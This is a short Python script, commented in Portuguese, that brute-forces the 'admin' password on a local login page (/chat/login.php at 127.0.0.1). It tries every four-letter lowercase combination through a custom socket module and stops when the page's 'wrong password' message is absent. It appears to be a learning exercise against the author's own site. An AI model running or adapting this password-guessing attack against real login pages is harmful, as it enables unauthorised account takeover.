from meu_soquete import *

def brute_force():
    letras="abcdefghijklmnopqrstuvwxyz"
    for letra_1 in letras:
        for letra_2 in letras:
            for letra_3 in letras:
                for letra_4 in letras:
                    senha=letra_1+letra_2+letra_3+letra_4
                    print("testando senha: "+senha)

                    #criamos um soquete e conectamos ele ao nosso site
                    cliente =meu_soquete_cliente("127.0.0.1",80)

                    #pedimos para ele testar um login e uma senha na parte de login
                    cliente.testar_login("/chat/login.php","login=admin&password="+senha)

                    #coletamos a resposta
                    resposta=resposta_errada=cliente.receber_resposta()
                    
                    if not ("senha incorreta, tu ta me zoando?" in resposta):
                        print("achei! Senha = "+senha)
                        return senha
                    
brute_force()



